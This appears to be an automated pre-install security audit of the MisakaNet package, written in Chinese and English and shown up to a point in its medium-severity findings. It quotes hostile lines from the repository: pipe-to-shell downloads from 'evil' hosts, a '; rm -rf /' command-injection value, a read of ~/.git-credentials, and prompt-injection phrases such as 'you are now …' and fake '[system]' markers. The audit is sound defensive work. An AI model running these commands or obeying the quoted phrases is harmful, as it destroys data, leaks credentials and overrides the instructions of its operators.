> 批量压测 / Batch stress test · ★ 493 · `Ikalus1988/MisakaNet`
> https://github.com/Ikalus1988/MisakaNet · audited in 10.0s
# 安装前体检 / Pre-install audit: misakanet@2.31.0

**信任评级 / Trust grade: D** (评分 / score 0/100 — 拒绝：存在严重风险信号 / refused: critical risk signals)

> **拒绝安装。** 该来源达到了配置的拒绝阈值。请先修复严重问题；若你已读过报告并接受风险，可把该包加入 `install.allow`。 / **Install refused.** This source met the configured refusal floor. Fix the critical findings, or add the package to `install.allow` if you have read them and accept the risk.

> **部分扫描。** 大小或文件数上限使分析提前结束，因此该评级只覆盖已读取的部分。 / **Partial scan.** A size or file-count cap stopped the analysis early, so this grade covers only the part that was read.

- 来源 / Source: `https://codeload.github.com/Ikalus1988/MisakaNet/tar.gz/HEAD` (URL / url)
- 已分析文件：2138 个（12.2 MiB） / Files analysed: 2138 (12.2 MiB)
- 内容摘要 / Content digest: `bc476b1ac482b80e45eaab780d6e0c0c…`
- 体检时间 / Audited at: 2026-09-20T09:53:02.622Z

## 最严重的风险 / Most severe risk

**凭据读取、解码步骤与对外请求同时出现 / Credential read, decoding step and outbound request together** `exfil.credential-read-decode-callback`

中 数据会离开这台机器。该包中有代码把本机上的内容发往外部地址。
EN Data leaves this machine. Something in this package takes content that lives here and sends it to a destination outside it.

该包会访问的目标：`github.com`、`misakanet.org`、`raw.githubusercontent.com`、`ikalus1988.github.io`、`api.cloudflare.com`、`registry.npmjs.org`、`x-access-token:${gh_token`、`api.minimax.chat` / Destinations this package reaches: `github.com`, `misakanet.org`, `raw.githubusercontent.com`, `ikalus1988.github.io`, `api.cloudflare.com`, `registry.npmjs.org`, `x-access-token:${gh_token`, `api.minimax.chat`

- 中 其中一部分经过混淆，源码看不出真正执行的是什么。
  EN Part of it is obfuscated, so the source does not show what actually executes.
- 中 它还安排了之后继续运行，所以仅仅卸载这个包并不够。
  EN It also arranges to run again later, so removing the package is not enough on its own.
- 中 本次扫描不完整，因此可能还有内容根本没被读到。
  EN The scan was partial, so there may be more that was never read.

决定该评级的规则命中于 `scripts/heartbeat.sh:12`；完整列表见下方「发现」。 / The rule that decided the grade fired at `scripts/heartbeat.sh:12`; the full list is under Findings below.

## 安装期脚本 / Install-time scripts

未声明。该包不会在安装它的机器上自动执行任何东西。 / None declared. Nothing in this package runs automatically on the machine that installs it.

## 该插件能触及什么 / What this plugin can reach

- **读取的文件路径 / File paths read:** `data/lessons.json`, `/tmp/pipeline-result.json`, `/tmp/pipeline-rerun.json`, `gate_report.txt`, `pytest_report.txt`, `provenance_report.txt`, `data/counter.json`, `misakanet/search/engine.py`, `misaka-protocol.json`, `misakanet_register.py`, `kv_store.json`, `{base}/{rel_path}` （另有 60 项） / (+60 more)
- **写入的文件路径 / File paths written:** `\n`, `node:fs/promises`, `\\n`, `voice-hook.mjs`, `.claude`, `.claude.json`, `settings.json`, `.claude/settings.json`, `CLAUDE.md`, `.claude/CLAUDE.md`, `.codex`, `config.toml` （另有 18 项） / (+18 more)
- **派生的命令 / Commands spawned:** `node:child_process`, `openclaw --version 2>&1`, `utf8`, `/usr/bin/logger`, `ignore`, `inherit`, `  $ spawn(/usr/bin/logger, [payload], { detached: true, shell: false })`, `/nonexistent`, `/usr/bin/logger; rm -rf /`, `journalctl --since "1 minute ago" --no-pager -o cat 2>&1 | grep "schemaVersion" | tail -1`, `child_process`, `--` （另有 35 项） / (+35 more)
- **连接的域名 / Domains contacted:** `github.com`, `misakanet.org`, `raw.githubusercontent.com`, `ikalus1988.github.io`, `api.cloudflare.com`, `registry.npmjs.org`, `x-access-token:${gh_token`, `api.minimax.chat`, `pypi.org`, `registry.modelcontextprotocol.io`, `x-access-token:${{`, `x-access-token:${git_token` （另有 24 项） / (+24 more)
- **读取的环境变量 / Environment variables read:** `RESULT`, `INPUT_PR_NUMBER`, `INTAKE_RESULT`, `PR_NUMBER`, `RUN_NAME`, `RUN_URL`, `ISSUE_NUMBER`, `PROTECTED`, `NODE_ALREADY_ASSIGNED`, `NEXT`, `USER`, `E2B_ERROR_HANDLER` （另有 39 项） / (+39 more)

## 发现 / Findings

### 严重 / CRITICAL (4)

- **严重 / CRITICAL** `destructive.shipped-command` — 内置破坏性文件系统命令 / Ships a destructive filesystem command
  中 抹掉用户主目录、根文件系统或分区的命令出现在可执行内容里，而不是文档描述中。即便有条件判断保护，这种原语也绝不该被塞进插件里。
  EN A command that erases a home directory, a root filesystem or a partition appears in executable content rather than in prose. Even guarded by a condition, it is a primitive that should never travel inside a plugin.
  - `docs/openclaw-pr/openclaw-fatal-hook-proof.mjs:52` — `const inj = spawn("/usr/bin/logger; rm -rf /", [JSON.stringify(payload)], { stdio: ["ignore", "inherit", "inherit"], detached: true, shell: false });`
  - `packages/fatal-guard/tests/sanitize-command.test.js:23` — `assert.equal(sanitizeCommand('echo; rm -rf /'), null);`
  - `packages/fatal-guard/tests/sanitize-command.test.js:55` — `const spec = buildSpawnSpec('echo; rm -rf /', ['x']);`
  - `tasks/lesson-permission-denied-fix.json:9` — `"solution": "**WSL NTFS crossmnt 问题：**\n```bash\n# 方案 1：修改 /etc/wsl.conf（需管理员）\n# 在 WSL 内部执行：\nsudo cat >> /etc/wsl.conf << 'EOF'\n[automount]\nenabled = true\n…`
  - ……另有 3 处 / … and 3 more location(s)
  中 修复：删除该命令。插件如果必须清理，应把删除限定在它自己创建的目录，并以包根目录为基准解析这个路径。
  EN Fix: Delete the command. If a plugin must clean up, restrict deletion to a directory it created and resolve that path from the package root.
- **严重 / CRITICAL** `exfil.credential-read-decode-callback` — 凭据读取、解码步骤与对外请求同时出现 / Credential read, decoding step and outbound request together
  中 编码外传的三个要素全部齐备：读取了凭据，有解码或编码动作，并且有请求离开本机。编码这一步的作用，正是让随便看一眼流量的人看不出其中的密钥。
  EN All three ingredients of an encoded exfiltration are present: a credential is read, something is decoded or encoded, and a request leaves the machine. The encoding step is what hides the secret from a casual look at the traffic.
  - `scripts/heartbeat.sh:12` — `export GH_TOKEN=$(sed -n 's/.*ghp_\([A-Za-z0-9]*\).*/ghp_\1/p' ~/.git-credentials 2>/dev/null || echo "")`
  - `.github/workflows/pr-thank-you.yml:45` — `const count = Buffer.from(file.data.content, "base64").toString("utf8").trim();`
  - `workers/email-register/src/email-utils.mjs:7` — `const binary = atob(normalized.replace(/\s/g, ''));`
  - `archive/dead/feishu_ws_client.py:2` — `Feishu WebSocket Client - 飞书长连接客户端`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：删除凭据读取或对外调用。绝不要发布既接触密钥、又在向外发送途中编码载荷的包。
  EN Fix: Remove the credential read or the outbound call. Never ship a package that both touches secrets and encodes a payload on its way out.
- **严重 / CRITICAL** `exfil.credential-read-then-callback` — 同一个包内既有凭据文件读取又有对外请求 / Credential file read and an outbound request in the same package
  中 既读取凭据文件又发起对外请求的包，已经凑齐了窃取凭据的两半。单独看每一半都能找到理由，合在一起就只能解释为数据被送出本机。
  EN A package that reads a credential file and also makes outbound requests has the two halves of credential theft. Individually each half can be justified; together they only make sense as data leaving the machine.
  - `scripts/heartbeat.sh:12` — `export GH_TOKEN=$(sed -n 's/.*ghp_\([A-Za-z0-9]*\).*/ghp_\1/p' ~/.git-credentials 2>/dev/null || echo "")`
  - `archive/dead/feishu_ws_client.py:2` — `Feishu WebSocket Client - 飞书长连接客户端`
  - `archive/dead/feishu_ws_client.py:3` — `使用 WebSocket 接收飞书消息并处理回调`
  - `archive/dead/feishu_ws_client.py:14` — `飞书 WebSocket 长连接客户端`
  中 修复：删除凭据读取。如果对外调用才是真正的功能，那么包内任何地方都不应在它之前读取密钥文件。
  EN Fix: Remove the credential read. If the outbound call is the real feature, it must not be preceded by a read of a secret file anywhere in the package.
- **严重 / CRITICAL** `priv.curl-pipe-shell` — 把下载内容直接管道给 shell / Pipes a download straight into a shell
  中 一步完成“拉取脚本并执行”，运行的就是远端服务器当时返回的任何内容；既没有可计算哈希、可审查、可固定版本的产物，服务器一旦被攻破就等于这台机器被攻破。
  EN Fetching a script and executing it in one step runs whatever the remote server returns at that moment; there is no artifact to hash, review or pin, and a compromise of the server becomes a compromise of this machine.
  - `tasks/lesson-github-actions-code-injection.json:12` — `curl http://evil/payload.sh | sh`
  - `workers/agent-autostart-hook.test.mjs:413` — `curl http://evil.example.com/x.sh | sh`
  中 修复：先下载产物、校验其校验和，再执行校验通过的文件；绝不要把下载内容管道给解释器。
  EN Fix: Download the artifact, verify its checksum, and execute the verified file; never pipe a download into an interpreter.

### 高 / HIGH (16)

- **高 / HIGH** `cred.credential-read-with-command-execution` — 同一个包内既有凭据文件读取又有 shell 执行 / Credential file read and shell execution in the same package
  中 这个包里某处读取了凭据文件，另一处又启动了进程。仅这一组合就足以把密钥管道给命令、通过 CLI 把它外传，或用窃取到的材料改写本机配置。
  EN A credential file is read somewhere in this package and a process is spawned somewhere else. That pairing is enough to pipe a secret into a command, exfiltrate it through a CLI, or rewrite the machine's configuration from stolen material.
  - `scripts/heartbeat.sh:12` — `export GH_TOKEN=$(sed -n 's/.*ghp_\([A-Za-z0-9]*\).*/ghp_\1/p' ~/.git-credentials 2>/dev/null || echo "")`
  - `integrations/agent-autostart/voice_hook.mjs:37` — `import { spawn } from 'node:child_process';`
  - `integrations/agent-autostart/voice_hook.mjs:220` — `const child = spawn(cmd, args, { detached: true, stdio: 'ignore' });`
  - `integrations/agent-autostart/voice_hook.mjs:360` — `const child = spawn(cmd, args, { detached: true, stdio: 'ignore' });`
  中 修复：删除凭据读取，并把进程启动限制在完全不会接触到密钥值的命令上。
  EN Fix: Remove the credential access, and keep process spawning limited to commands that never see secret values.
- **高 / HIGH** `cred.read-system-secret` — 读取系统密钥库或钥匙串 / Reads a system secret store or keychain
  中 该行读取了 `/etc/shadow`、钥匙串文件或 `.git-credentials`，或者通过 `security`、`keytar` 之类的库操作 macOS 钥匙串，从而拿到其他应用保存的密码。
  EN The line reads `/etc/shadow`, a keychain file, `.git-credentials`, or drives the macOS keychain through `security`, `keytar` or an equivalent library, which exposes stored passwords for other applications.
  - `scripts/heartbeat.sh:12` — `export GH_TOKEN=$(sed -n 's/.*ghp_\([A-Za-z0-9]*\).*/ghp_\1/p' ~/.git-credentials 2>/dev/null || echo "")`
  中 修复：删除这次读取。确实需要某个已保存的密钥时，应向用户索取，并通过有文档说明的宿主配置项读取。
  EN Fix: Remove the read. If a stored secret is required, ask the user and read it through a documented harness configuration key.
- **高 / HIGH** `destructive.recursive-delete-system-path` — 递归删除指向用户主目录或系统目录 / Recursive delete aimed at a home or system directory
  中 递归删除的目标是用户主目录或系统路径，一旦变量写错、展开为空或缺少判空保护，被销毁的就是用户数据而不是包自己的构建产物。
  EN A recursive delete targets a home directory or a system path, so a wrong variable, an empty expansion or a missing guard destroys user data instead of the package's own build output.
  - `docs/openclaw-pr/openclaw-fatal-hook-proof.mjs:52` — `const inj = spawn("/usr/bin/logger; rm -rf /", [JSON.stringify(payload)], { stdio: ["ignore", "inherit", "inherit"], detached: true, shell: false });`
  - `misakanet/scripts/lesson_watcher.sh:53` — `rm -rf ~/.hermes/lessons/*.md ~/.hermes/lessons/*/`
  - `misakanet/scripts/lesson_watcher.sh:93` — `rm -rf ~/.hermes/lessons/*.md ~/.hermes/lessons/*/ # 清理旧文件，避免残留`
  - `packages/fatal-guard/tests/sanitize-command.test.js:23` — `assert.equal(sanitizeCommand('echo; rm -rf /'), null);`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：只删除包在自己目录下创建的路径，并在解析出的路径不位于该目录内时拒绝执行。
  EN Fix: Delete only paths the package created under its own directory, and refuse to run when the resolved path is not inside it.
- **高 / HIGH** `exfil.archive-home` — 打包用户主目录 / Archives a home directory
  中 该命令把用户主目录或 `$HOME` 打成压缩包，把配置、凭据和历史记录收进一个文件，随后很容易被带离本机。
  EN The command packs a home directory or `$HOME` into an archive, which collects configuration, credentials and history into a single file that is then easy to move off the machine.
  - `docs/benchmarks/benchmark-2026-08-28.json:396` — `zip\n```\n**Step 2: Create a virtual environment**\n\nCreate a new virtual environment for `agent-reach` using the following command:\n```bash\npython3 -m venv ~/.agent-reach-venv\n```\n**Step 3: Activate the virtual environment**\n\nActiva…`
  中 修复：只打包该包自己的输出目录，绝不要把用户主目录通配进 tarball。
  EN Fix: Archive only the package's own output directory, and never glob a home directory into a tarball.
- **高 / HIGH** `exfil.curl-post-body` — 用 curl 上传本地文件 / Uploads a local file with curl
  中 该命令把磁盘上的文件 POST 到远程端点（`-d @`、`--data-binary @`、`-F …=@`、`-T`），本质上是伪装成表单提交的文件上传。
  EN The command posts a file from disk to a remote endpoint (`-d @`, `--data-binary @`, `-F …=@`, `-T`), which is a file upload disguised as a form post.
  - `.github/actions/notify-failure/action.yml:89` — `curl -s -X POST`
  - `.github/workflows/d1-bootstrap.yml:66` — `curl -fsS --max-time 30 -X POST`
  - `.github/workflows/lesson-notify.yml:27` — `curl -s -X POST`
  - `.github/workflows/sync-d1.yml:66` — `curl -fsS --max-time 30 -X POST`
  - ……另有 4 处 / … and 4 more location(s)
  中 修复：删除这次上传，或让目标地址显式且可配置，使用户能看清自己的数据去了哪里。
  EN Fix: Remove the upload, or make the destination explicit and configurable so a user can see where their data goes.
- **高 / HIGH** `net.covert-channel` — 通过 websocket 或 DNS 查询回连 / Beacons over a websocket or DNS lookup
  中 该行打开了 websocket，或通过 `dns.*` 或 DNS 工具解析某个域名。两者都能在不像是 HTTP 请求的情况下传递数据，而 DNS 尤其通常被所有防火墙和代理放行。
  EN The line opens a websocket or resolves a literal domain through `dns.*` or a DNS tool. Both carry data without looking like an HTTP request, and DNS in particular is normally permitted through every firewall and proxy.
  - `tasks/lesson-chrome-relay-browser-automation.json:13` — `"solution": "### 步骤 1：启动带调试端口的 Chrome\n\n**方式 A — WSL/Linux 下的无头 Chrome：**\n```bash\nchromium-browser --remote-debugging-port=9222 --no-sandbox --headless \\\n …`
  - `tasks/lesson-curl-request-troubleshoot.json:13` — `"solution": "```bash\n# 1. DNS 解析\nnslookup example.com\ndig example.com\n# 正常返回 IP 地址 → DNS OK\n# 返回 NXDOMAIN / server can't find → DNS 问题\n\n# 2. 网络连通性（跳过代理）\…`
  中 修复：改用发往文档中说明的端点的普通 HTTPS 请求，让流量可以被检查和记录。
  EN Fix: Use ordinary HTTPS requests to a documented endpoint so that the traffic can be inspected and logged.
- **高 / HIGH** `net.excessive-distinct-hosts` — 包连接的不同主机数量多得不合常理 / Package contacts an implausible number of distinct hosts
  中 对外目标涉及的主机数量超出插件合理所需。这种大面积铺开，正是让遥测、中继和投放服务躲在每一个都看似平常的端点之间的办法。
  EN The package reaches 33 distinct remote hosts (api.cloudflare.com, api.minimax.chat, github.com, ikalus1988.github.io, misakanet.org, raw.githubusercontent.com, registry.npmjs.org, x-access-token:${gh_token, …). That is far more than a plugin needs, and the report cannot attribute the surplus to any documented feature.
  - `.codex-plugin/plugin.json:7` — `https://github.com/Ikalus1988`
  - `.codex-plugin/plugin.json:9` — `https://misakanet.org`
  - `.cursor/rules/misakanet-failure-memory.mdc:46` — `https://misakanet.org/mcp`
  - `.github/actions/misaka-intake-bot/action.yml:142` — `https://raw.githubusercontent.com/Ikalus1988/MisakaNet/$FETCH_REF/scripts/intake_bot.py`
  中 修复：把目标列表收敛到有文档说明的服务，删除插件无法给出理由的任何端点。
  EN Fix: Reduce the destination list to the documented service, and remove any endpoint the plugin cannot justify.
- **高 / HIGH** `net.raw-ip-destination` — 向裸 IP 地址发送请求 / Sends a request to a bare IP address
  中 目标写成了数字地址而不是主机名，因此绕过 DNS、无法归属到任何域名，而且通常指向内网网段，或指向并非插件所声称对接的服务。
  EN The destination is written as a numeric address rather than a hostname, so it bypasses DNS, cannot be attributed to a domain, and usually points at a private range or a host that is not the service the plugin claims to talk to.
  - `packages/misakanet-setup/scripts/e2e-packaged-install.mjs:316` — `return { state, url: `http://127.0.0.1:${server.address().port}/mcp`, close: () => server.close() };`
  - `tasks/lesson-chrome-relay-browser-automation.json:13` — `"solution": "### 步骤 1：启动带调试端口的 Chrome\n\n**方式 A — WSL/Linux 下的无头 Chrome：**\n```bash\nchromium-browser --remote-debugging-port=9222 --no-sandbox --headless \\\n …`
  - `tasks/lesson-git-tls-handshake-failure.json:13` — `"solution": "```bash\n# 1. 先重试一次（如果是瞬时问题）\ngit pull origin main\n\n# 2. 如果持续失败，配置代理\ngit config --global http.proxy http://127.0.0.1:7890\ngit config --global h…`
  - `tasks/lesson-github-dns-443-block-hosts-workaround.json:13` — `"solution": "### 1. 验证当前 DNS 解析的 IP 是否可达\n\n```bash\nGITHUB_IP=$(getent hosts github.com | awk '{print $1}')\ntimeout 3 bash -c \"echo > /dev/tcp/$GITHUB_IP/443…`
  - ……另有 10 处 / … and 10 more location(s)
  中 修复：使用文档中说明的主机名并通过 HTTPS 访问，删除所有能被指向裸地址的代码。
  EN Fix: Use the documented hostname over HTTPS, and remove any code that can be pointed at a raw address.
- **高 / HIGH** `net.token-or-blob-in-url` — 把凭据或编码数据块放进 URL / Puts a credential or encoded blob in a URL
  中 令牌形状的查询参数、内嵌的 `user:password` 授权部分，或超长高熵的查询值，都意味着密钥或载荷数据在 URL 中传输，最终会留在访问日志、代理和浏览器历史里。
  EN A token-shaped query parameter, an embedded `user:password` authority, or a long high-entropy query value means secret material or payload data travels in a URL, where it lands in access logs, proxies and browser history.
  - `.github/workflows/fix-dco.yml:123` — `//x-access-token:${GH_TOKEN}@`
  - `.github/workflows/sync-data.yml:37` — `"https://«redacted»@github.com/${GITHUB_REPOSITORY}.git"`
  - `.github/workflows/update-badges.yml:89` — `"https://«redacted»@github.com/${GITHUB_REPOSITORY}.git"`
  - `data/query-aliases.json:3213` — `"# format: https://«redacted»@github.com (placeholder example, not a real credential)"`
  - ……另有 13 处 / … and 13 more location(s)
  中 修复：凭据放在 Authorization 头里发送，载荷用 POST 放在请求体中，不要编码进查询字符串。
  EN Fix: Send credentials in an Authorization header, and POST payloads in the body rather than encoding them into the query string.
- **高 / HIGH** `persist.global-self-install` — 全局安装依赖包 / Installs a package globally
  中 该命令把包安装到全局前缀，于是用户的 PATH 上多出一个可执行文件，而且当前项目删除后它仍然留在那里。
  EN The command installs a package into the global prefix, which puts a new executable on the user's PATH and keeps it there after the current project is deleted.
  - `.github/workflows/apply-d1-schema.yml:31` — `npm install -g`
  - `.github/workflows/d1-bootstrap.yml:47` — `npm install -g`
  - `.github/workflows/d1-counters-report.yml:32` — `npm install -g`
  - `.github/workflows/intake-pipeline-test.yml:36` — `npm install -g`
  - ……另有 6 处 / … and 6 more location(s)
  中 修复：改为本地安装，并通过项目自身的脚本调用该工具；全局安装应由用户自己决定，而不是由插件代劳。
  EN Fix: Install locally and invoke the tool through the project's own scripts; global installs belong to the user's decision, not to a plugin.
- **高 / HIGH** `persist.scheduled-task-write` — 安装计划任务、agent 或系统服务 / Installs a scheduled task, agent or service
  中 该行注册了稍后会自动运行的东西——cron 条目、launch agent、systemd unit、Windows 计划任务或注册表 Run 键——因此插件在把它装进来的那次安装结束之后仍在持续执行。
  EN The line registers something that runs later — a cron entry, launch agent, systemd unit, Windows scheduled task or registry Run key — so the plugin keeps executing after the install that brought it in.
  - `tasks/lesson-cron-job-not-running.json:12` — `"solution": "```bash\n# 1. 检查 cron 是否运行\nsudo systemctl status cron\n# 或\nps aux | grep cron\n\n# 2. 打印当前 crontab\ncrontab -l\n\n# 3. 写入测试作业（确认 cron 工作机制）\ncron…`
  - `tasks/lesson-openclaw-重装教训-删除前先停服务清残留.json:9` — `"solution": "重装前必须执行：\n\n```bash\n# 1. 停止所有 openclaw 相关进程\nsystemctl --user stop openclaw-gateway.service\npkill -f openclaw || true\n\n# 2. 确认无残留\nps aux | gre…`
  - `tasks/lesson-wsl-proxy-setup.json:12` — `"solution": "```bash\n# 1. 设置代理环境变量（临时）\nexport http_proxy=http://$(hostname).local:7890\nexport https_proxy=http://$(hostname).local:7890\nexport HTTP_PROXY=$h…`
  中 修复：删除这一定时注册，或交给用户一条有文档说明、可以自行运行和审查的命令。
  EN Fix: Remove the scheduling, or hand the user a documented command they can run and review themselves.
- **高 / HIGH** `priv.sudo-invocation` — 通过 sudo 提权 / Escalates with sudo
  中 该行通过 `sudo` 执行命令，意味着这个以用户级工具身份安装的插件在索要 root 权限，而用户事先看不到提权提示。
  EN The line runs a command through `sudo`, so the plugin is asking for root on a machine where it was installed as a user-level tool and where the user cannot see the escalation prompt in advance.
  - `data/query-aliases.json:2202` — `"quote": "- For projects that prefer pipx: `pipx install <package>` works similarly but requires `pipx` to be installed first (often needs sudo on Ubuntu)."`
  - `docs/benchmarks/benchmark-2026-08-28.json:160` — `"sudo apt-get update",`
  - `docs/benchmarks/benchmark-2026-08-28.json:161` — `"sudo apt-get install sqlite3 libsqlite3-dev",`
  - `docs/benchmarks/benchmark-2026-08-28.json:354` — `"sudo apt-get update",`
  - ……另有 3 处 / … and 3 more location(s)
  中 修复：去掉提权，把任何需要特权的步骤写成一条由用户主动执行的独立命令并加以说明。
  EN Fix: Remove the escalation and document any privileged step as a separate command the user runs deliberately.
- **高 / HIGH** `priv.system-path-modification` — 修改系统路径或把文件设为全局可写 / Modifies a system path or makes a file world-writable
  中 该行写入 `/etc`、`/usr`、`/bin` 或 launch daemon 目录，把属主改为 root，或设置全局可写权限。任何一种都改变了安装包之外的机器状态，也可能为后续提权铺路。
  EN The line writes under `/etc`, `/usr`, `/bin` or a launch-daemon directory, changes ownership to root, or sets world-writable permissions. Any of these changes the machine beyond the installed package and can prepare an escalation later.
  - `docs/benchmarks/benchmark-2026-08-28.json:396` — `"content": "The error you're experiencing is likely due to the fact that the `agent-reach` tool is not properly configured or installed. Here's a step-by-step g…`
  - `tasks/lesson-github-dns-443-block-hosts-workaround.json:13` — `"solution": "### 1. 验证当前 DNS 解析的 IP 是否可达\n\n```bash\nGITHUB_IP=$(getent hosts github.com | awk '{print $1}')\ntimeout 3 bash -c \"echo > /dev/tcp/$GITHUB_IP/443…`
  - `tasks/lesson-permission-denied-fix.json:9` — `"solution": "**WSL NTFS crossmnt 问题：**\n```bash\n# 方案 1：修改 /etc/wsl.conf（需管理员）\n# 在 WSL 内部执行：\nsudo cat >> /etc/wsl.conf << 'EOF'\n[automount]\nenabled = true\n…`
  - `tasks/lesson-permission-denied-fix.json:9` — `solution**WSL NTFS crossmnt 问题：**\n```bash\n# 方案 1：修改 /etc/wsl.conf（需管理员）\n# 在 WSL 内部执行：\nsudo cat >> /etc/wsl.conf << 'EOF'\n[automount]\nenabled = true\noptio…`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：把写入限制在包目录或用户自己的配置目录内，绝不要为了让安装成功而放宽权限。
  EN Fix: Keep writes inside the package or the user's own configuration directory, and never loosen permissions to make an install succeed.
- **高 / HIGH** `prompt.doc-instruction` — 文档中包含针对模型的指令 / Documentation contains instructions aimed at a model
  中 随包发布的文档命令读者——在这个宿主里就是 AI agent——忽略先前的指令、对用户隐瞒信息，或跳过确认。这样的文字会被当作指令读取，而不是文档。
  EN A shipped document orders the reader — which in this harness is an AI agent — to ignore earlier instructions, withhold information from the user, or skip confirmation. Text like this is read as instructions, not as documentation.
  - `archive/skills/browser-harness.SKILL.md:3` — `description: Use when you need to control a browser programmatically — scraping, automating web tasks, filling forms, taking screenshots, or bypassing anti-bot …`
  - `CONTRIBUTING.md:43` — `someone who already has the structure, not a way to bypass review. Merging is a human step in all three.`
  - `docs/agents/content-injection-defense.md:50` — `| `role_hijack` | medium | "you are now …", "act as an administrator" |`
  - `docs/agents/content-injection-defense.md:50` — `role_hijackyou are now …act as an administrator`
  - ……另有 46 处 / … and 46 more location(s)
  中 修复：把这段话改写成面向人类读者的插件说明，并删除任何直接对模型说话的措辞。
  EN Fix: Rewrite the passage as a description of the plugin for a human reader, and remove any language that addresses the model directly.
- **高 / HIGH** `prompt.embedded-instruction-string` — 源码字符串中夹带针对模型的指令 / Source string carries instructions aimed at a model
  中 源码中的字符串字面量——通常是工具描述或系统提示词片段——要求模型绕过确认或对用户隐瞒某些事，于是它作为一条指令进入上下文窗口。
  EN A string literal in the source — typically a tool description or system prompt fragment — tells the model to bypass confirmation or to hide something from the user, so it lands in the context window as a directive.
  - `data/benchmark_tasks.json:14` — `"Switch to a mirror index-url (e.g. tsinghua), increase --default-timeout, or add --trusted-host as a temporary bypass."`
  - `data/query-aliases.json:1616` — `"lessons/contrib/browser-automation-csp-bypass.md"`
  - `data/query-aliases.json:1635` — `"lessons/contrib/browser-automation-csp-bypass.md"`
  - `data/query-aliases.json:1654` — `"lessons/contrib/browser-automation-csp-bypass.md"`
  - ……另有 16 处 / … and 16 more location(s)
  中 修复：如实描述工具的行为，删除那些会改变 agent 对待用户方式的指令。
  EN Fix: Describe the tool's behavior factually and remove directives that change how the agent treats the user.
- **高 / HIGH** `prompt.fake-system-message` — 文本伪装成系统消息 / Text impersonates a system message
  中 这段文字模仿系统或开发者消息的形式（`<system>`、`[SYSTEM]`、`<<SYS>>`、“system message:”）。自称拥有特权角色的内容，是想在模型上下文中抬高自己的权威。
  EN The text is shaped like a system or developer message (`<system>`, `[SYSTEM]`, `<<SYS>>`, "system message:"). Content that claims a privileged role is an attempt to raise its own authority inside the model's context.
  - `AGENTS.md:159` — `[system]`
  - `docs/agents/content-injection-defense.md:47` — `[system]`
  - `tests/test_injection_scan.py:27` — `[SYSTEM]`
  - `workers/intake-injection-scan.test.mjs:122` — `[system]`
  中 修复：删除这些角色标记；面向用户的文本绝不应该被写成看起来像宿主指令的样子。
  EN Fix: Remove the role markers; user-visible text should never be formatted to look like harness instructions.

### 中 / MEDIUM (11)

- **中 / MEDIUM** `cred.many-secret-env-vars` — 读取多个不同名称的密钥类环境变量 / Reads several differently-named secret environment variables
  中 这里的一行、或整个包里的若干行，读取了名称看起来像凭据的环境变量。只读一个文档中声明的 key 是插件本该有的认证方式；枚举多个不同名称的密钥，则是在收集凭据而不是在使用凭据。
  EN One line here, or several across the package, read environment variables whose names look like credentials. Reading a single documented key is how a plugin is meant to authenticate; enumerating many differently-named ones is how credentials are gathered rather than used.
  - `integrations/agent-autostart/checkpoint_reminder.mjs:231` — `process.env.MISAKANET_TOKEN`
  中 修复：只保留插件确实需要且有文档说明的变量，删掉与任何功能无关的密钥读取。
  EN Fix: Keep to the variables this plugin documents and needs, and delete reads of keys it has no feature for.
- **中 / MEDIUM** `cred.read-dotenv-or-history` — 读取 dotenv 文件或 shell 历史 / Reads a dotenv file or shell history
  中 该行读取了 `.env` 或 shell 历史文件。这两处都是令牌、云密钥和曾经粘贴过的密钥堆积的地方，而 shell 历史还会勾勒出用户的基础设施全貌。
  EN This line reads `.env` or a shell history file. Both are where tokens, cloud keys and previously pasted secrets accumulate, and a shell history also maps out the user's infrastructure.
  - `packages/misakanet-setup/scripts/e2e-packaged-install.mjs:673` — `const env = readFileSync(join(home, '.hermes', '.env'), 'utf8');`
  - `workers/misakanet-setup.test.mjs:676` — `assert.match(readFileSync(join(home, '.hermes', '.env'), 'utf8'),`
  - `workers/misakanet-setup.test.mjs:735` — `assert.ok(!existsSync(join(home, '.hermes', '.env')),`
  中 修复：通过插件配置 schema 加载配置，而不是读取 dotenv 文件；永远不要打开用户的历史记录。
  EN Fix: Load configuration through the plugin config schema instead of reading dotenv files, and never open the user's history.
- **中 / MEDIUM** `install.dependency-manifest-hook` — 随包携带的清单声明了安装钩子 / Bundled manifest declares install hooks
  中 非包根目录的清单声明了生命周期钩子。从这棵目录树安装的内置或嵌套依赖会运行自己的安装脚本，却不会像已发布依赖那样经过仓库审查。
  EN A manifest other than the package root declares lifecycle hooks. A vendored or nested dependency installed from this tree runs its own install scripts without the registry review that a published dependency would have had.
  - `packages/misakanet-setup/package.json:16` — `"prepack": "node scripts/copy-hook.mjs",`
  - `vscode-extension/package.json:45` — `"vscode:prepublish": "npm run compile",`
  中 修复：通过锁文件从仓库安装嵌套依赖，并删除自带钩子的内置清单。
  EN Fix: Install nested dependencies from the registry with a lockfile, and delete vendored manifests that carry their own hooks.
- **中 / MEDIUM** `install.hook-runs-shell-code` — 安装期钩子执行的不只是构建 / Lifecycle hook runs more than a build
  中 该钩子命令不属于常见的编译与拷贝步骤，安装这个包时会以用户权限运行任意代码，而这一切发生在任何人来得及检查之前。
  EN This hook command is not one of the usual compile-and-copy steps, so installing the package runs arbitrary code with the user's privileges before anything can be inspected.
  - `packages/misakanet-setup/package.json:16` — `"prepack": "node scripts/copy-hook.mjs",`
  中 修复：把钩子收敛为 `tsc` 或 `npm run build` 之类的构建命令，或把这项工作移到一个由用户主动执行的显式脚本里。
  EN Fix: Reduce the hook to a build command such as `tsc` or `npm run build`, or move the work into an explicit script the user chooses to run.
- **中 / MEDIUM** `install.native-downloader` — 安装流程会编译或下载原生产物 / Install path builds or downloads a native artifact
  中 依赖包在安装期间编译原生代码或拉取预编译二进制文件，于是最终在本机被执行的不是被审查过的源码。
  EN The package compiles native code or fetches a prebuilt binary during install, so bytes that are not the reviewed source end up executed on this machine.
  - `docs/lessons/npm-native-build-arch-mismatch/index.html:7` — `<meta name="description" content="A frontend project installed fine on the developer's laptop but failed in CI with a postinstall native-build error (`node-gyp`…`
  - `docs/lessons/npm-native-build-arch-mismatch/index.html:10` — `<meta property="og:description" content="A frontend project installed fine on the developer's laptop but failed in CI with a postinstall native-build error (`no…`
  - `docs/lessons/npm-native-build-arch-mismatch/index.html:34` — `<p>A frontend project installed fine on the developer's laptop but failed in CI with a postinstall native-build error (`node-gyp` / `binding.gyp` / `prebuild-in…`
  - `scripts/tombstone_to_draft.py:217` — `hints.append("段错误 —— 极可能是 native 模块（.node / .so）与当前平台不兼容，检查 node-gyp 编译")`
